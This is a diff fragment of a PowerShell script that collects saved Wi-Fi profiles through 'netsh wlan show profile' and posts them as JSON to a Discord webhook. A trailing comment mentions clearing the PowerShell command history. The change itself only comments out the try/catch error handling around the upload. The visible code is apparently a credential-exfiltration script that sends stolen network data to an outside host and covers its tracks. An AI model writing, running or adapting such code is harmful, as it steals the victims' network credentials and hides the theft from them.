@@ -38,11 +38,11 @@ netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
     }
 $JsonBody = ($Body | ConvertTo-Json -Compress)
 # Remove the comments if you want debug it
-    try {
+#    try {
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $JsonBody
-    } catch {
-        Write-Host "Some err: $_"
-    }
+ #   } catch {
+  #      Write-Host "Some err: $_"
+   # }
 }
 
 # Clear the PowerShell command history
